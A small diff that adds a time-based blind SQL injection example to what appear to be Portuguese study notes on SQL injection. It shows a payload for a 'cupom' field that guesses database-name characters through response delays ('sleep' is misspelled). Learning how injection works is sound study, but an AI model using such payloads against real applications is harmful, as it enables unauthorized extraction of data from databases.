@@ -248,6 +248,10 @@ perguntando a primeira do dado  registrado em login
 
 login = admin
 
+============================ TIME-Based=========================================
+exemplo:
+cupom=' or if (ascii(substring(database(),2,2)) = 98, sllep(5),0)# ---> baseado em tempo apos perguntar ao servidor se ele demorar 5 segundos a resposta e correta se ele respomder antes a pergunta esta errada  
+
 
 
 
